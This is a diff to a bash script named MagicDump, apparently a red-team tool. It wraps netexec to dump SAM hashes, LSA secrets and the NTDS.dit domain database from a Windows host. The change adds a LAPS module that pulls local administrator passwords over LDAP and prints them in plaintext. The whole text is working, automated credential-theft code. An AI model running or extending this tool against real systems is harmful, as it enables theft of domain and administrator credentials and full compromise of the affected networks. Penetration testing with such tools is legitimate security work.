@@ -252,7 +252,8 @@ run_command() {
 
 # Function to construct the base command
 construct_base_cmd() {
-  local base_cmd="nxc smb $TARGET_HOST -u $USERNAME"
+  local module="$1"
+  local base_cmd="nxc $module $TARGET_HOST -u $USERNAME"
 
   if [[ $KRB_AUTH -eq 1 && $NO_PASS -eq 1 && -z "$KRB5CCNAME" ]]; then
     echo -e "${RED}[ERROR]${RESET} KRB5CCNAME must be set when using Kerberos ticket cache (--no-pass)."
@@ -312,7 +313,7 @@ parse_lsa_output() {
 dump_sam() {
   local output_file="$TARGET_DUMP_DIR/SAM_dump_${TARGET_HOST}.txt"
   local cmd
-  cmd=$(construct_base_cmd)" --sam > '$output_file' 2>&1"
+  cmd=$(construct_base_cmd "smb")" --sam > '$output_file' 2>&1"
 
   add_log "Starting SAM dump using netexec..."
   if run_command "$cmd"; then
@@ -328,7 +329,7 @@ dump_sam() {
 dump_lsa() {
   local output_file="$TARGET_DUMP_DIR/LSA_dump_${TARGET_HOST}.txt"
   local cmd
-  cmd=$(construct_base_cmd)" --lsa > '$output_file' 2>&1"
+  cmd=$(construct_base_cmd "smb")" --lsa > '$output_file' 2>&1"
 
   add_log "Starting LSA dump using netexec..."
   if run_command "$cmd"; then
@@ -365,7 +366,7 @@ dump_ntds() {
 
   # Construct the base command
   local cmd
-  cmd=$(construct_base_cmd)" --ntds"
+  cmd=$(construct_base_cmd "smb")" --ntds > '$output_file' 2>&1"
 
   # Log the operation
   add_log "Starting NTDS dump using drsuapi..."
@@ -386,10 +387,44 @@ dump_ntds() {
   fi
 }
 
+parse_laps_output() {
+  local output_file="$1"
+  echo -e "${GREEN}[LAPS PASSWORDS FOUND]:${RESET}"
+
+  grep "Computer:" "$output_file" | while IFS= read -r line; do
+    # Extract fields
+    computer=$(echo "$line" | grep -oP "(?<=Computer:)[^ ]+")
+    user=$(echo "$line" | grep -oP "(?<=User:)[^ ]*")
+    password=$(echo "$line" | grep -oP "(?<=Password:).*")
+    
+    # Default user to 'administrator' if blank
+    [[ -z "$user" ]] && user="administrator"
+
+    echo "  Computer: $computer, User: $user, Password: $password"
+  done
+}
+
+dump_laps() {
+  local output_file="$TARGET_DUMP_DIR/LAPS_dump_${TARGET_HOST}.txt"
+  local cmd
+  cmd=$(construct_base_cmd "ldap")" -M laps > '$output_file' 2>&1"
+
+  add_log "Starting LAPS dump using LDAP..."
+  if run_command "$cmd"; then
+    log_operation "LAPS" "success" "\"file_path\": \"$output_file\", \"method\": \"laps\""
+    add_log "LAPS dump saved to $output_file"
+    parse_laps_output "$output_file"
+  else
+    log_operation "LAPS" "failed" "\"error\": \"Failed to dump LAPS passwords\""
+    add_warning "Failed to dump LAPS passwords on target $TARGET_HOST"
+  fi
+}
+
 # Main Logic
 add_log "Starting MagicDump against target $TARGET_HOST"
 add_log "Authenticating as user '$USERNAME'..."
 dump_sam
 dump_lsa
 dump_ntds
+dump_laps
 echo -e "${GREEN}[INFO]${RESET} Dumping complete. Logs saved to $LOG_FILE."
